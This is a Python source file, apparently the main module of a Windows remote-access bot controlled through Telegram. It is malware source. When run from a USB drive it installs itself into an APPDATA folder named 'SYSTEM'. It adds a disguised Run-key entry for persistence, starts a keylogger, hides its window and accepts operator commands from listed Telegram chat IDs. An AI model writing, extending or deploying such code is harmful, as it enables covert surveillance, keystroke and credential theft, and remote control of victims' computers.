import os
import sys
import winreg
import asyncio
import shutil
import subprocess
import ctypes

from aiogram import Bot, Dispatcher, types
from aiogram.fsm.context import FSMContext
from aiogram.types import Message, CallbackQuery
from config import TOKEN, KNOWN_IDS
from handlers import handle_message, send_safe_message, handle_hotkey_callback
from loggers import setup_logging, start_keylogger
from commands import hide_bot


def add_to_startup():
    try:
        exe_path = os.path.abspath(sys.executable)

        key = winreg.CreateKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run"
        )

        try:
            winreg.QueryValueEx(key, "SYSTEM")
        except FileNotFoundError:
            winreg.SetValueEx(
                key,
                "SYSTEM",
                0,
                winreg.REG_SZ,
                exe_path
            )

        winreg.CloseKey(key)

    except Exception as e:
        pass


def is_running_from_usb():
    """Проверяет запущен ли бот с флешки"""
    try:
        exe_path = os.path.abspath(sys.argv[0])
        drive = os.path.splitdrive(exe_path)[0] + '\\'
        drive_type = ctypes.windll.kernel32.GetDriveTypeW(drive)
        # DRIVE_REMOVABLE = 2
        return drive_type == 2
    except:
        return False


def install_to_appdata():
    """Копирует бота в APPDATA и запускает оттуда"""
    try:
        target_dir = os.path.join(os.environ['APPDATA'], 'SYSTEM')
        os.makedirs(target_dir, exist_ok=True)

        current_exe = os.path.abspath(sys.argv[0])
        target_exe = os.path.join(target_dir, os.path.basename(current_exe))

        if os.path.dirname(current_exe) == target_dir:
            return False

        shutil.copy2(current_exe, target_exe)

        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                                 winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SYSTEM", 0, winreg.REG_SZ, target_exe)
            winreg.CloseKey(key)
        except:
            pass

        # Запускаем копию
        subprocess.Popen(target_exe, shell=True)

        return True
    except Exception as e:
        print(f"Ошибка установки: {e}")
        return False


async def main():
    # Проверяем, запущен ли с флешки
    if is_running_from_usb():
        # print("Запущено с флешки. Устанавливаю в APPDATA...")
        if install_to_appdata():
            # print("Установка завершена, перезапуск из APPDATA...")
            return

    add_to_startup()

    setup_logging()
    start_keylogger()

    bot = Bot(token=TOKEN)
    dp = Dispatcher()
    hide_bot()

    @dp.message()
    async def handle_all_messages(message: Message, state: FSMContext):
        await handle_message(message, bot, state)

    @dp.callback_query()
    async def handle_all_callbacks(callback: CallbackQuery):
        await handle_hotkey_callback(callback, bot)

    for chat_id in KNOWN_IDS:
        await send_safe_message(bot, chat_id, "Бот запущен")

    await dp.start_polling(bot)


if __name__ == '__main__':
    asyncio.run(main())


